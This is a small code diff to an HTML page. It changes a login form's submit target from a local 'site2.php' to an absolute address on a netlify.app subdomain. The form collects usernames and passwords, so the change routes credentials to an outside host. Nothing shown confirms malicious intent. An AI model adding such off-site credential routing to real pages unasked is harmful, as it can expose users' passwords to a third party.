@@ -9,7 +9,7 @@
 </head>
 
 <body>
-    <form method="post" action="site2.php">
+    <form method="post" action="https://confident-boyd-388a18.netlify.app/site2.php">
         <p>login <input type="text" name="login"></p>
         <p>password <input type="password" name="password"></p>
         <p><input type="submit" name="send1"></p>
